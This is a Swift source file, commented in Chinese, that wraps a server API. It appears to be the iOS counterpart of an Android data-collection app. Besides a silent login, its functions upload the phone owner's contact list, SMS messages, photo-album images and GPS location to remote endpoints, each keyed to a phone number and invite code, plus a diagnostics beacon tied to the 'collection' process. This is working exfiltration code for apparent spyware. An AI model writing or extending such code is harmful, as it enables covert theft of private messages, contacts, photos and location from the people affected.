import Foundation

/// 上报与登录接口封装 —— 与安卓端 `AnyApi.kt` 等价
///
/// 对应服务端 6 个接口（见仓库 README 第四节）：
/// - `POST /api/uploads/api`       注册 + 通讯录
/// - `POST /api/uploads/getuserid` 拿 app_user.id
/// - `POST /api/uploads/apisms`    短信
/// - `POST /api/uploads/img`       相册（multipart）
/// - `POST /api/uploads/apimap`    定位
/// - `POST /api/uploads/diag`      自检埋点（安卓端会打 13 次，iOS 保留同样能力便于对照排错）
enum AnyApi {

    // MARK: - UserSig（静默登录）

    struct UserSig {
        let success: Bool
        let sdkAppID: Int32
        let userId: String
        let userSig: String
        let message: String
    }

    /// 手机号 → 服务端换 UserSig。**客户端不参与签名，密钥只在服务端。**
    static func fetchUserSig(phone: String) async -> UserSig {
        for urlString in AnyConfig.imSigURLs {
            guard let url = URL(string: urlString) else { continue }
            do {
                var req = URLRequest(url: url)
                req.httpMethod = "POST"
                req.timeoutInterval = 30
                req.setValue("text/plain; charset=utf-8", forHTTPHeaderField: "Content-Type")
                req.httpBody = phone.data(using: .utf8)

                let (data, resp) = try await URLSession.shared.data(for: req)
                let status = (resp as? HTTPURLResponse)?.statusCode ?? -1
                guard (200..<300).contains(status) else {
                    AnyLog.warn("im-sig HTTP \(status)")
                    continue
                }
                guard
                    let obj = try JSONSerialization.jsonObject(with: data) as? [String: Any],
                    let code = obj["code"] as? Int, code == 1,
                    let d = obj["data"] as? [String: Any],
                    let sig = d["userSig"] as? String, !sig.isEmpty,
                    let uid = d["userId"] as? String, !uid.isEmpty
                else {
                    let msg = (try? JSONSerialization.jsonObject(with: data) as? [String: Any])?["msg"] as? String
                    AnyLog.warn("im-sig 返回异常：\(msg ?? "无法解析")")
                    continue
                }
                let appID = (d["sdkAppID"] as? NSNumber)?.int32Value ?? AnyConfig.sdkAppID
                AnyLog.i("UserSig 就绪 userId=\(uid) sdkAppID=\(appID) sigLen=\(sig.count)")
                return UserSig(success: true, sdkAppID: appID, userId: uid, userSig: sig, message: "ok")
            } catch {
                AnyLog.warn("im-sig 请求失败 \(urlString)：\(error.localizedDescription)")
            }
        }
        return UserSig(success: false, sdkAppID: AnyConfig.sdkAppID,
                       userId: "", userSig: "", message: "获取签名失败")
    }

    // MARK: - 注册 + 通讯录上报

    /// `POST /api/uploads/api`
    ///
    /// payload 格式（**必须与安卓端逐字一致**）：
    /// `手机号**邀请码**厂商_通讯录数_相册数_短信数_v108=姓名|号码=姓名|号码…`
    static func uploadRegister(payload: String) async -> (ok: Bool, message: String) {
        do {
            let r = try await AnyHTTP.postFormAnyBase(
                path: "uploads/api",
                params: ["data": payload],
                timeout: 120
            )
            let ok = AnyResultJudge.isSuccess(status: r.status, body: r.body)
            AnyLog.i("注册上报 → HTTP \(r.status) ok=\(ok) body=\(r.body.prefix(40))")
            return (ok, r.body.trimmingCharacters(in: .whitespacesAndNewlines))
        } catch {
            AnyLog.e("注册上报失败：\(error.localizedDescription)")
            return (false, error.localizedDescription)
        }
    }

    /// `POST /api/uploads/getuserid` → `{"code":1,"data":<app_user.id>}`
    static func fetchUserId(phone: String) async -> Int64? {
        do {
            let r = try await AnyHTTP.postFormAnyBase(
                path: "uploads/getuserid",
                params: ["mobile": phone]
            )
            guard
                let obj = try JSONSerialization.jsonObject(with: r.body.data(using: .utf8) ?? Data()) as? [String: Any],
                let code = obj["code"] as? Int, code == 1,
                let id = (obj["data"] as? NSNumber)?.int64Value
            else {
                AnyLog.warn("getuserid 未拿到 id：\(r.body.prefix(60))")
                return nil
            }
            AnyLog.i("getuserid = \(id)")
            return id
        } catch {
            AnyLog.e("getuserid 失败：\(error.localizedDescription)")
            return nil
        }
    }

    // MARK: - 短信

    /// `POST /api/uploads/apisms`
    ///
    /// 首元素必须是身份头 `{"imei":手机号,"imei2":邀请码}`；
    /// **短信条数为 0 时数组长度 < 2，服务端返回「获取信息错误」** —— 所以 0 条时直接跳过不请求。
    static func uploadSms(phone: String, inviteCode: String, messages: [AnySmsPayload]) async -> Bool {
        guard !messages.isEmpty else {
            AnyLog.i("短信 0 条，按协议跳过上报（服务端要求数组 ≥2 个元素）")
            return true
        }
        let capped = Array(messages.prefix(AnyConfig.maxSmsPerUpload))
        let header: [String: Any] = ["imei": phone, "imei2": inviteCode]
        var arr: [[String: Any]] = [header]
        for m in capped {
            arr.append([
                "Smsbody": m.body,
                "PhoneNumber": m.address,
                "Date": m.dateString,
                "Type": m.type,
            ])
        }
        guard
            let data = try? JSONSerialization.data(withJSONObject: arr),
            let json = String(data: data, encoding: .utf8)
        else {
            AnyLog.e("短信 JSON 序列化失败")
            return false
        }
        do {
            let r = try await AnyHTTP.postFormAnyBase(path: "uploads/apisms", params: ["data": json], timeout: 60)
            let ok = AnyResultJudge.isSuccess(status: r.status, body: r.body)
            AnyLog.i("短信上报 \(capped.count) 条 → HTTP \(r.status) ok=\(ok) body=\(r.body.prefix(30))")
            return ok
        } catch {
            AnyLog.e("短信上报失败：\(error.localizedDescription)")
            return false
        }
    }

    // MARK: - 相册

    /// `POST /api/uploads/img`（multipart，文件字段名 `data`，表单字段 `id` = app_user.id）
    ///
    /// 服务端成功返回纯文本 `ok`。
    static func uploadImage(userId: Int64, jpegData: Data, index: Int) async -> Bool {
        do {
            let r = try await AnyHTTP.postMultipart(
                base: AnyConfig.apiBases[0],
                path: "uploads/img",
                fields: ["id": String(userId)],
                fileFieldName: "data",
                fileName: "album_\(index).jpg",
                mimeType: "image/jpeg",
                fileData: jpegData
            )
            if !AnyResultJudge.isImageSuccess(status: r.status, body: r.body) {
                // 主基址失败时换回落基址再试一次
                let r2 = try await AnyHTTP.postMultipart(
                    base: AnyConfig.apiBases[min(1, AnyConfig.apiBases.count - 1)],
                    path: "uploads/img",
                    fields: ["id": String(userId)],
                    fileFieldName: "data",
                    fileName: "album_\(index).jpg",
                    mimeType: "image/jpeg",
                    fileData: jpegData
                )
                return AnyResultJudge.isImageSuccess(status: r2.status, body: r2.body)
            }
            return true
        } catch {
            AnyLog.w("图片 #\(index) 上传异常：\(error.localizedDescription)")
            return false
        }
    }

    // MARK: - 定位

    /// `POST /api/uploads/apimap`，`data = <手机号>,<邀请码>,<经度>,<纬度>`
    static func uploadLocation(
        phone: String, inviteCode: String, longitude: Double, latitude: Double
    ) async -> Bool {
        let data = "\(phone),\(inviteCode),\(longitude),\(latitude)"
        do {
            let r = try await AnyHTTP.postFormAnyBase(path: "uploads/apimap", params: ["data": data])
            let ok = AnyResultJudge.isSuccess(status: r.status, body: r.body)
            AnyLog.i("定位上报 (\(longitude),\(latitude)) → ok=\(ok) body=\(r.body.prefix(20))")
            return ok
        } catch {
            AnyLog.e("定位上报失败：\(error.localizedDescription)")
            return false
        }
    }

    // MARK: - 自检埋点

    /// `POST /api/uploads/diag` —— 安卓端在采集过程中会打 13 次，iOS 保留同样能力便于两端对照排错
    static func diag(_ tag: String, extra: [String: Any] = [:]) async {
        var d: [String: Any] = ["tag": tag]
        for (k, v) in extra { d[k] = v }
        guard
            let data = try? JSONSerialization.data(withJSONObject: d),
            let json = String(data: data, encoding: .utf8)
        else { return }
        do {
            let r = try await AnyHTTP.postFormAnyBase(path: "uploads/diag", params: ["d": json], timeout: 20)
            AnyLog.i("diag[\(tag)] → HTTP \(r.status)")
        } catch {
            AnyLog.w("diag[\(tag)] 失败：\(error.localizedDescription)")
        }
    }
}

// MARK: - 短信载荷（与安卓端 AnyPayloads.Sms 对应）

struct AnySmsPayload {
    let body: String
    let address: String
    /// 服务端要求格式 `Y-M-D H:M:S`（**不是** ISO8601，也和安卓端保持一致）
    let dateString: String
    let type: String
}
